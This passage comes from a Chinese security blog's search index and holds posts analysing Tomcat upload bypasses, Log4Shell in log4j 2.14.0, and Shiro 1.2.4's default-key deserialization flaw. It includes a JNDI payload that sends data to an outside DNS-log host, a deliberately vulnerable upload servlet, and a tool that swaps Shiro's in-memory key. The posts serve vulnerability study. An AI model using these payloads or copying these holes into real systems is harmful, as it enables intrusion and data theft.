然后我们计算一下recover1的md5我们发现被删除的文件已经被恢复了。 TIPS程序运行中还在打开的文件，即使删除了也可以使用上述方法进行恢复。","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://f19t.github.io.git/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://f19t.github.io.git/tags/linux/"}]},{"title":"tomcat文件上传tips","slug":"tomcat文件上传tips","date":"2023-03-19T13:28:54.000Z","updated":"2023-03-19T13:31:04.195Z","comments":true,"path":"2023/03/19/tomcat文件上传tips/","link":"","permalink":"https://f19t.github.io.git/2023/03/19/tomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0tips/","excerpt":"tomcat文件上传tips简单梳理一下tomcat中文件上传的一些tips。","text":"tomcat文件上传tips简单梳理一下tomcat中文件上传的一些tips。 环境说明： apache-tomcat-8.5.83 java version “1.8.0_152” commons-fileupload 1.4 没有设置黑白名单我们首先使用commons.fileupload，写一个上传器servlet 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package org.f19t.java_upload;/** * author: f19t * Date: 2023/3/19 15:50 */import java.io.File;import java.io.IOException;import java.util.Arrays;import java.util.Iterator;import java.util.List;import javax.servlet.ServletException;import javax.servlet.annotation.MultipartConfig;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import org.apache.commons.fileupload.servlet.ServletFileUpload;@WebServlet(&quot;/FileUploadServlet&quot;)@MultipartConfig(fileSizeThreshold = 1024 * 1024 * 2, // 2MB maxFileSize = 1024 * 1024 * 10, // 10MB maxRequestSize = 1024 * 1024 * 50) // 50MBpublic class FileUploadServlet extends HttpServlet &#123; private static final long serialVersionUID = 1L; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; if (ServletFileUpload.isMultipartContent(request)) &#123; DiskFileItemFactory factory = new DiskFileItemFactory(); ServletFileUpload fileUpload = new ServletFileUpload(factory); String rootPath = request.getServletContext().getRealPath(&quot;/&quot;); // 上传文件的目录// fileUpload.setFileItemFactory(new BlacklistFileItemFactory(Arrays.asList(&quot;.jsp&quot;))); try &#123; List&lt;FileItem&gt; items = fileUpload.parseRequest(request); Iterator&lt;FileItem&gt; iter = items.iterator(); while (iter.hasNext()) &#123; FileItem item = iter.next(); if (!item.isFormField()) &#123; String fileName = new File(item.getName()).getName(); String filePath = rootPath + File.separator + fileName; File uploadedFile = new File(filePath); item.write(uploadedFile); response.setCharacterEncoding(&quot;utf-8&quot;); response.getWriter().write(&quot;File uploaded successfully: &quot; + rootPath + fileName); &#125; &#125; &#125; catch (FileUploadException e) &#123; response.getWriter().write(&quot;File upload failed.&quot;); e.printStackTrace(); &#125; catch (Exception e) &#123; response.getWriter().write(&quot;Exception: &quot; + e.getMessage()); e.printStackTrace(); &#125; &#125; else &#123; response.getWriter().write(&quot;Only multipart/form-data requests are accepted&quot;); &#125; &#125;&#125; 这里学到一点，下方代码可以获取当前webapp的网站根目录。 1request.getServletContext().getRealPath(&quot;/&quot;); 我们再写一个html提交表单 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;File Upload Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;FileUploadServlet&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;label for=&quot;file&quot;&gt;Choose a file to upload:&lt;/label&gt;&lt;br&gt; &lt;input type=&quot;file&quot; id=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 可以发现成功上传，因为我们没有设置黑白名单。 QP编码因为commons-fileupload1.3版本开始可以使用QP编码，所以我们可以使用QP编码去绕过一些正则表达式的匹配。 设置黑名单禁止上传jsp我们写一个BlacklistFileItemFactory工厂类，它扩展了DiskFileItemFactory，并在创建文件项对象时检查文件类型。 123456789101112131415161718192021222324252627282930313233343536package org.f19t.java_upload;import org.apache.commons.fileupload.FileItem;import org.apache.commons.fileupload.FileUploadException;import org.apache.commons.fileupload.disk.DiskFileItemFactory;import java.util.List;/** * author: f19t * Date: 2023/3/19 16:54 */public class BlacklistFileItemFactory extends DiskFileItemFactory &#123; private List&lt;String&gt; blacklist; public BlacklistFileItemFactory(List&lt;String&gt; blacklist) &#123; this.blacklist = blacklist; &#125; @Override public FileItem createItem(String fieldName, String contentType, boolean isFormField, String fileName) &#123; if (!isFormField &amp;&amp; fileName != null) &#123; for (String ext : blacklist) &#123; if (fileName.endsWith(ext)) &#123; try &#123; throw new FileUploadException(&quot;File type not allowed.&quot;); &#125; catch (FileUploadException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125; &#125; return super.createItem(fieldName, contentType, isFormField, fileName); &#125;&#125; 我们在文件上传servlet的doPost() 里面添加fileUpload.setFileItemFactory(new BlacklistFileItemFactory(Arrays.asList(“.jsp”))); 然后我们再次进行上传：即使我们使用QP编码，也还是可以被检测出来。 禁止上传jsp但存在目录穿越为了产生目录穿越漏洞，我们将之前写的上传servlet的doPost() 里面修改： String fileName &#x3D; new File(item.getName()).getName(); &#x2F;&#x2F;被修改 String fileName &#x3D; item.getName(); &#x2F;&#x2F;修改成 这样我们上传一次目录穿越的jsp试一下。发现我们可以传到其他的目录里面， 上传jartips：Servlet 3.0 协议规范中，包含在 Jar 文件 &#x2F;META-INF&#x2F;resources&#x2F; 路径下的资源可以直接被web访问。 所以这里我们传一个jar包到WEB-INF&#x2F;lib里面,这里我们新建一个jar包 我们通过修改数据包，将jar传到lib文件夹下 加载jar在 $TOMCAT_HOME&#x2F;conf&#x2F;context.xml 文件配置下，记录了一些配置文件路径。如果这些配置文件变动，就会进行重新加载这些jar包。我的web.xml文件内容默认如下： 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt;&lt;/web-app&gt; 然后我填加了一个人畜无害的 1welcome-file&gt;upload1.html&lt;/welcome-file&gt; 总的新的xml如下： 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot; version=&quot;4.0&quot;&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;upload1.html&lt;/welcome-file&gt; &lt;/welcome-file-list&gt;&lt;/web-app&gt; 因为我们上传文件属于覆盖，所以这个操作的危险性是非常高的，实战不推荐使用。因为我们并不能保证可以给他恢复完整。,并且业务如果做了一些自己的配置，我们没办法给他恢复。 覆盖完成之后我们就可以访问上传jar包里面的myjar.jsp了。 参考文章： https://su18.org/post/Desperate-Cat/ https://javasec.org/java-vuls/FileUpload.html","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://f19t.github.io.git/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"log4jshell-2.14.0漏洞分析","slug":"log4jshell-2-14-0漏洞分析","date":"2023-03-17T09:39:55.000Z","updated":"2023-03-17T09:52:16.740Z","comments":true,"path":"2023/03/17/log4jshell-2-14-0漏洞分析/","link":"","permalink":"https://f19t.github.io.git/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"log4jshell-2.14.0漏洞分析这篇文章分析一下log4jshell的漏洞代码层面产生的原因。","text":"log4jshell-2.14.0漏洞分析这篇文章分析一下log4jshell的漏洞代码层面产生的原因。 环境准备 java version “1.8.0_152” idea 2023.3.3 log4j-core 2.14.0 手工创建环境过程： 首先在pom.xml里面添加依赖 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.14.0&lt;/version&gt;&lt;/dependency&gt; 第二步在resources文件夹下添加log4j2.xml 12345678910111213141516&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;configuration status=&quot;error&quot;&gt; &lt;appenders&gt; &lt;!-- 配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot; &gt; &lt;!-- 配置Console的模式布局--&gt; &lt;PatternLayout pattern=&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;/&gt; &lt;/Console&gt; &lt;/appenders&gt; &lt;loggers&gt; &lt;root level=&quot;error&quot;&gt; &lt;appender-ref ref=&quot;Console&quot;/&gt; &lt;/root&gt; &lt;/loggers&gt;&lt;/configuration&gt; 第三步我们写一个简单的验证程序 12345678910111213141516package org.example;import org.apache.logging.log4j.LogManager;import org.apache.logging.log4j.Logger;/** * author: f19t * Date: 2023/3/16 18:43 */public class Test &#123; private static final Logger logger = LogManager.getLogger(Test.class); public static void main(String[] args) &#123; String a=&quot;$&#123;java:version&#125;&quot;; logger.error(a); &#125;&#125; 运行这个Test将会得到 12023-03-17 15:12:04.362 [main] ERROR org.example.Test - Java version 1.8.0_152 漏洞分析漏洞产生的位置在org.apache.logging.log4j.core.lookup.Interpolator.lookup()方法。此方法存在一个strLookupMap，map内部的Key和value是我们利用的关键。里面有： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657public Interpolator(final Map&lt;String, String&gt; properties)&#123; this.strLookupMap = new HashMap(); this.defaultLookup = new MapLookup((Map)(properties == null ? new HashMap() : properties)); this.strLookupMap.put(&quot;log4j&quot;, new Log4jLookup()); this.strLookupMap.put(&quot;sys&quot;, new SystemPropertiesLookup()); this.strLookupMap.put(&quot;env&quot;, new EnvironmentLookup()); this.strLookupMap.put(&quot;main&quot;, MainMapLookup.MAIN_SINGLETON); this.strLookupMap.put(&quot;marker&quot;, new MarkerLookup()); this.strLookupMap.put(&quot;java&quot;, new JavaLookup()); this.strLookupMap.put(&quot;lower&quot;, new LowerLookup()); this.strLookupMap.put(&quot;upper&quot;, new UpperLookup()); try &#123; this.strLookupMap.put(&quot;jndi&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;, StrLookup.class)); &#125; catch (Exception | LinkageError var9) &#123; this.handleError(&quot;jndi&quot;, var9); &#125; try &#123; this.strLookupMap.put(&quot;jvmrunargs&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;, StrLookup.class)); &#125; catch (Exception | LinkageError var8) &#123; this.handleError(&quot;jvmrunargs&quot;, var8); &#125; this.strLookupMap.put(&quot;date&quot;, new DateLookup()); this.strLookupMap.put(&quot;ctx&quot;, new ContextMapLookup()); if (Constants.IS_WEB_APP) &#123; try &#123; this.strLookupMap.put(&quot;web&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.web.WebLookup&quot;, StrLookup.class)); &#125; catch (Exception var7) &#123; this.handleError(&quot;web&quot;, var7); &#125; &#125; else &#123; LOGGER.debug(&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;); &#125; try &#123; this.strLookupMap.put(&quot;docker&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.docker.DockerLookup&quot;, StrLookup.class)); &#125; catch (Exception var6) &#123; this.handleError(&quot;docker&quot;, var6); &#125; try &#123; this.strLookupMap.put(&quot;spring&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;, StrLookup.class)); &#125; catch (Exception var5) &#123; this.handleError(&quot;spring&quot;, var5); &#125; try &#123; this.strLookupMap.put(&quot;kubernetes&quot;, Loader.newCheckedInstanceOf(&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;, StrLookup.class)); &#125; catch (Exception var3) &#123; this.handleError(&quot;kubernetes&quot;, var3); &#125; catch (NoClassDefFoundError var4) &#123; this.handleError(&quot;kubernetes&quot;, var4); &#125; &#125; 我们在lookup方法的漏洞触发的位置位置下断点，我们跟进分析一下。 运行Test，断点位置的堆栈如下： 12345678910111213141516171819202122232425262728293031lookup:223, Interpolator (org.apache.logging.log4j.core.lookup)resolveVariable:1116, StrSubstitutor (org.apache.logging.log4j.core.lookup)substitute:1038, StrSubstitutor (org.apache.logging.log4j.core.lookup)substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)toSerializable:345, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)toText:244, PatternLayout (org.apache.logging.log4j.core.layout)encode:229, PatternLayout (org.apache.logging.log4j.core.layout)encode:59, PatternLayout (org.apache.logging.log4j.core.layout)directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config)callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config)callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config)callAppender:84, AppenderControl (org.apache.logging.log4j.core.config)callAppenders:543, LoggerConfig (org.apache.logging.log4j.core.config)processLogEvent:502, LoggerConfig (org.apache.logging.log4j.core.config)log:485, LoggerConfig (org.apache.logging.log4j.core.config)log:460, LoggerConfig (org.apache.logging.log4j.core.config)log:82, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)log:161, Logger (org.apache.logging.log4j.core)tryLogMessage:2198, AbstractLogger (org.apache.logging.log4j.spi)logMessageTrackRecursion:2152, AbstractLogger (org.apache.logging.log4j.spi)logMessageSafely:2135, AbstractLogger (org.apache.logging.log4j.spi)logMessage:2011, AbstractLogger (org.apache.logging.log4j.spi)logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi)error:740, AbstractLogger (org.apache.logging.log4j.spi)main:14, Test (org.example) 我们一步一步的分析，首先调用logger.error(a);，error又会调用logIfEnabledlogIfEnabled又调用isEnabled判断日志是否支持记录isEnabled又调用filter，这里的filter其实就是我们之前写的log4j2.xml的配置文件。 判断可以记录之后调用logMessage 中间的过程就不分析了，一直到format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) 首先我看先看一下这个format方法里面的offset他其实就是获取我们log4j2.xml里面的日志输出前缀，然后把msg里面的messageFormat加到workingBuilder里面，下面的for循环是判断字符串里面是否存在${，如果存在那么去substring获取这个范围的字符串，其实就是获取用户输入的字符串。 这里获取到用户输入的value，然后调用replace replace又去调用substitute 接着substitute又去调用substitute 调用substitute之后获取到了varName，调用resolveVariable， resolveVariable再进行调用lookup lookup里面将prefix、name取出，然后调用lookup这个map，这个map为之前介绍的strLookupMap。 因为我们写的调用为${java:version}，所以他会走到JavaLookup这个里面的lookup里面。 之后运行结束得到结果： tips支持递归substitute里面通过while循环去递归匹配查询${，所以我们可以写入如下payload： 1String a=&quot;$&#123;jndi:ldap://$&#123;java:version&#125;.xxxxx.ceye.io&#125;&quot;; 高版本jndijndi的ldap默认支持8版本191版本之前的，要想突破高版本的现在，目前我了解了两种方法可以绕过高版本限制： 通过反序列化去绕过 使用目标本地工厂类 因为这两个点内容也很多，后面文章再补充这方面的知识。","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://f19t.github.io.git/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"},{"name":"log4j2","slug":"log4j2","permalink":"https://f19t.github.io.git/tags/log4j2/"}]},{"title":"shiro 1.2.4反序列化命令执行漏洞分析","slug":"shiro-1-2-4反序列化命令执行漏洞分析","date":"2023-03-14T12:40:05.000Z","updated":"2023-06-17T08:14:15.328Z","comments":true,"path":"2023/03/14/shiro-1-2-4反序列化命令执行漏洞分析/","link":"","permalink":"https://f19t.github.io.git/2023/03/14/shiro-1-2-4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"shiro 1.2.4反序列化命令执行漏洞分析前几天本来想复现fastjson系列的漏洞，但是看了一段时间fastjson的源码变量名称都是x、y、z这种无规则无规范的命名方式，十分头晕，所以打算还是先分析一下shiro的漏洞原理吧。下方所有实验代码在https://github.com/f19t/shiro_1.2.4env","text":"shiro 1.2.4反序列化命令执行漏洞分析前几天本来想复现fastjson系列的漏洞，但是看了一段时间fastjson的源码变量名称都是x、y、z这种无规则无规范的命名方式，十分头晕，所以打算还是先分析一下shiro的漏洞原理吧。下方所有实验代码在https://github.com/f19t/shiro_1.2.4env 环境准备： jdk 1.8.0_152 idea 2023.3.3 shiro-spring 1.2.4 Spring boot 2.6.11 反序列化漏洞位置反序列化的位置在org.apache.shiro.io.DefaultSerializer的deserialize() 方法我们在反序列化的位置下断点，我们使用写的登录界面成功登录之后，会获得一个rememberMe，然后我们带着rememberMe访问任何一个界面，注意shiro1.2.4我在写spring boot这个程序的时候会获取一个jsessionid，我们需要删掉这个jsessionid，只保留rememberMe的cookie进行访问。 关键堆栈 123456deserialize:77, DefaultSerializer (org.apache.shiro.io)deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt) 我们跟进去看一下代码运行的逻辑。 首先resolvePrincipals中调用principals &#x3D; this.getRememberedIdentity(context);去处理rememberMe， 然后getRememberedIdentity调用getRememberedPrincipals。 之后getRememberedPrincipals又两个关键处理:第一处getRememberedSerializedIdentity进行base64解码。第二处就是将字节进行解密并反序列化。 第一处解码base64第二处解密并反序列化。这里注意解密的方法在org.apache.shiro.mgt.AbstractRememberMeManager中，其中key默认为private static final byte[] DEFAULT_CIPHER_KEY_BYTES &#x3D; Base64.decode(“kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;”);如果没有设置key。加解密key为默认值。 private byte[] encryptionCipherKey; private byte[] decryptionCipherKey; 该类中存在setCipherKey方法，如果设置了setCipherKey那么最终的key为设置的。 这里我们并没有进行设置key所以使用默认的key进行加解密。 至此，我们就可以进行构造反序列化，执行命令，执行回显这里就不多介绍了。 shiro tips修改key我们知道获取key是在org.apache.shiro.mgt.AbstractRememberMeManager但是这个类是抽象类，具体实现类在org.apache.shiro.web.mgt.CookieRememberMeManager。 我们用之前写的搜索程序，来搜一下看一下线程里面是否包含CookieRememberMeManager。这里我又学到一点，fields[i].get(obj).getClass().getName()获取到的可能是org.springframework.web.servlet.DispatcherServlet$$Lambda$572&#x2F;995785821这种匿名类或者是代理的类，我们通过Class.forName()是获取不到这种类的，所有我把之前写的location代码进行了一处修改，就是把Class clazz &#x3D; lcat.obj.getClass();直接从obj去获取class。location.javapackage org.example.spring_shiro;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.catalina.connector.Request;import org.apache.catalina.connector.RequestFacade;import org.apache.catalina.connector.Response;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.Field;import java.util.*;/** * author: f19t * Date: 2023/3/6 15:35 */public class location extends AbstractTranslet &#123; public location(Object obj, String clazz, String path) &#123; this.obj = obj; this.path = path; this.clazz = clazz; &#125; public Object obj; public String path; public String clazz; public static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//队列保证广度优先搜索 public static Set&lt;Object&gt; set = new HashSet&lt;Object&gt;();//set记录哪些对象被搜索过 public static void search() throws ClassNotFoundException &#123; location laco = new location(Thread.currentThread(), &quot;org.apache.tomcat.util.threads.TaskThread&quot;,&quot;TaskThread&quot;); queue.offer(laco); set.add(Thread.currentThread()); int i=0; while (queue.size()&gt;0) &#123; i++; basic_search1(queue.poll());// if (i==500)&#123;break;&#125; &#125; &#125; public static void basic_search1(location lcat) throws ClassNotFoundException &#123; Object obj = lcat.obj; String path = lcat.path; Class clazz = lcat.obj.getClass(); try &#123;// Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;); for (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123; Field fields[] = clazz.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); if (fields[i].get(obj) == null)&#123;continue;&#125; if (!isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != null &amp;&amp; set.add(fields[i].get(obj))) &#123; if (is_map(fields[i].getType().getSimpleName())) &#123; Map map = (Map) fields[i].get(obj); if (map.size() &gt; 0) &#123; for (int map_num = 0; map_num &lt; map.size(); map_num++) &#123; Object map_obj = map.get(map_num); if (map_obj != null &amp;&amp; set.add(map_obj) &amp;&amp; !isblack(map_obj.getClass().getName())) &#123; location l = new location(map_obj, map_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;+map_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (is_list(fields[i].getType().getSimpleName())) &#123; List list = (List) fields[i].get(obj); if (list.size() &gt; 0) &#123; for (int list_num = 0; list_num &lt; list.size(); list_num++) &#123; Object list_obj = list.get(list_num); if (list_obj != null &amp;&amp; set.add(list_obj) &amp;&amp; !isblack(list_obj.getClass().getName())) &#123; location l = new location(list_obj, list_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + list_num + &quot;]&quot;+list_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (fields[i].getType().isArray()) &#123;// Object objarr1 = fields[i].get(obj); try &#123; Object[] arrobj = (Object[])fields[i].get(obj); if (arrobj.length &gt; 0) &#123; for (int obj_num = 0; obj_num &lt; arrobj.length; obj_num++) &#123; Object arr_obj = arrobj[obj_num]; if (arr_obj != null &amp;&amp; set.add(arr_obj) &amp;&amp; !isblack(arr_obj.getClass().getName())) &#123; location l = new location(arr_obj, arr_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + obj_num + &quot;]&quot;+arr_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; &#125;catch (Throwable e)&#123;// System.out.println(fields[i].get(obj)); &#125; continue; &#125; if (is_target(fields[i],obj)) &#123; System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);// RequestFacade reqfd = (RequestFacade) fields[i].get(obj);// Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);// f.setAccessible(true);//因为是protected// Request req = (Request) f.get(reqfd);//反射获取值// Field ff = req.getClass().getDeclaredField(&quot;response&quot;);// ff.setAccessible(true);// Response resp = (Response) ff.get(req);// PrintWriter out = resp.getWriter();// out.println(&quot;wwwwww&quot;); &#125; location l = new location(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); queue.offer(l);// System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); &#125; &#125; &#125; &#125; catch (IllegalAccessException ex) &#123; throw new RuntimeException(ex); &#125; &#125; public static boolean isblack(String s) &#123; Boolean aBoolean = false; List&lt;String&gt; black = new ArrayList&lt;String&gt;(Arrays.asList(&quot;java.lang.Byte&quot;, &quot;java.lang.Short&quot;, &quot;java.lang.Integer&quot;, &quot;java.lang.Long&quot;, &quot;java.lang.Float&quot;, &quot;java.lang.Boolean&quot;, &quot;java.lang.String&quot;, &quot;java.lang.Class&quot;, &quot;java.lang.Character&quot;, &quot;java.io.File&quot;, &quot;byte&quot;, &quot;short&quot;, &quot;int&quot;, &quot;long&quot;, &quot;double&quot;, &quot;float&quot;, &quot;boolean&quot; )); for (int i = 0; i &lt; black.size(); i++) &#123; if (s == black.get(i)) &#123; aBoolean = true; return aBoolean; &#125; &#125; return aBoolean; &#125; public static boolean is_target(Field f,Object o) throws IllegalAccessException, ClassNotFoundException &#123; boolean b = false; if (// f.getName() == &quot;request&quot;// || f.get(o).getClass().getName() == &quot;org.apache.catalina.connector.RequestFacade&quot;// || f.get(o).getClass().getName() == &quot;org.apache.catalina.connector.Request&quot;// || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.Request&quot;))// || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.core.ApplicationHttpRequest&quot;))// f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;)) f.get(o).getClass().getName().contains(&quot;CookieRememberMeManager&quot;)// || f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;))// || f.get(o).getClass().getName() == &quot;org.apache.catalina.core.ApplicationHttpRequest&quot;// || f.get(o).getClass().getName() == &quot;org.apache.coyote.Request&quot;// || f.get(o).getClass().getSimpleName() == &quot;Request&quot;// || f.get(o).getClass().getSimpleName() == &quot;HttpServletRequest&quot;// || f.getName() == &quot;req&quot;// || f.get(o).getClass().getName() == &quot;org.apache.coyote.RequestGroupInfo&quot;)// &amp;&amp; f.get(o).getClass().getName()!=&quot;java.lang.Object&quot; )&#123; return true; &#125; return b; &#125; public static boolean is_list(String s) &#123; boolean b = false; if (&quot;List&quot;.equals(s) || &quot;ArrayList&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; public static boolean is_map(String s) &#123; boolean b = false; if (&quot;Map&quot;.equals(s) || &quot;HashMap&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 我们之间在hello这个路径上添加location.search() 登录之后访问hello我们可以获得线程里面的，这里我只获取到一条，网络上有人获取了两条，估计是版本的问题。 123456TaskThread---&gt;inheritableThreadLocals(java.lang.ThreadLocal$ThreadLocalMap)--&gt;table[6]java.lang.ThreadLocal$ThreadLocalMap$Entry---&gt;value(java.util.HashMap)--&gt;table[6]java.util.HashMap$Node---&gt;value(org.apache.shiro.web.mgt.DefaultWebSecurityManager)---&gt;rememberMeManager(org.apache.shiro.web.mgt.CookieRememberMeManager) 我们尝试修改线程里面的key看一下能否修改全局的key。 首先我们设置两条访问入口路线。 1234567891011@GetMapping(&quot;/hello&quot;) public String hello() throws ClassNotFoundException &#123; location.search(); return &quot;hello&quot;; &#125; @GetMapping(&quot;/hello1&quot;) public String hello1() throws ClassNotFoundException &#123; return &quot;hello1&quot;; &#125; 访问hello是获取CookieRememberMeManager并修改key。 123456if (is_target(fields[i],obj)) &#123;System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);CookieRememberMeManager cookieRememberMeManager = (CookieRememberMeManager) fields[i].get(obj);System.out.println( Base64.encodeToString(cookieRememberMeManager.getDecryptionCipherKey()));cookieRememberMeManager.setCipherKey(Base64.decode(&quot;3AvVhmFLUs0KTA3Kprsdag==&quot;));&#125; 然后我们在AbstractRememberMeManager的里面下两个断点。 convertPrincipalsToBytes &#x2F;&#x2F;生成rememberMe，会调用到encrypt convertPrincipalsToBytes &#x2F;&#x2F;解密rememberMe，会调用decrypt 然后我们登录。断点捕获到之后，我们调用评估表达式输入Base64.encodeToString(getDecryptionCipherKey()) 我们发现key为kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;。是默认的。 之后我们访问一下hello1。发现key也是kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D; 